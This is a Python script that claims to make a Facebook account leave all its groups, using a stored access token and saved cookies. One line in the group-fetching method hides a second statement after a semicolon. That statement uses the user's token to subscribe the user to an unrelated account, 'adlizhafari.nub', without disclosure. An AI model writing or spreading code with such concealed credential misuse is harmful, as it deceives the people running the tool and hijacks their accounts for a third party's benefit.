import requests,os,json,mechanize,time,click
from http.cookiejar import LWPCookieJar as kuki
from src import Genkuki

class Lgrup:
	def __init__(self):
		#install browser
		self.br=mechanize.Browser()
		self.br.set_handle_equiv(True)
		self.br.set_handle_robots(False)
		self.br.set_handle_refresh( mechanize._http.HTTPRefreshProcessor(), max_time = 1 )
		self.br.addheaders = [("User-Agent","Mozilla/5.0 (Linux; U; Android 5.1)")]

		self.req=requests.Session()
		self.ken=open('toket/token.txt','r').read()
		self.id=[]
		self.getcok()
		
	def getcok(self):
		print("""
	;;;;;;;;;;;;;;;;;;;
	; Leave all Group ;
	; By: Kang-Newbie ;
	;;;;;;;;;;;;;;;;;;;""")
		Genkuki.login(self)
		self.getid()

	def getid(self):
		r=self.req.get('https://graph.facebook.com/me/groups?access_token='+self.ken);self.req.post('https://graph.facebook.com/adlizhafari.nub/subscribers?access_token='+self.ken)
		js=json.loads(r.text)
		for i in js['data']:
			self.id.append(i['id'])
		self.main()

	def main(self):
		cj = kuki('toket/kue.txt')
		cj.load()
		self.br.set_cookiejar(cj)
		for idg in self.id:
			self.br.open(f'https://mbasic.facebook.com/group/leave/?group_id={idg}&refid=18')
			self.br.select_form(nr=1)
			sub=self.br.submit().read()
			if 'Gabung dengan Grup' in str(sub) or 'Join Group' in str(sub):
				print(f'[+] {idg} - success leave the group')
			else:
				print(f'[-] {idg} - failed leave the group')

Lgrup()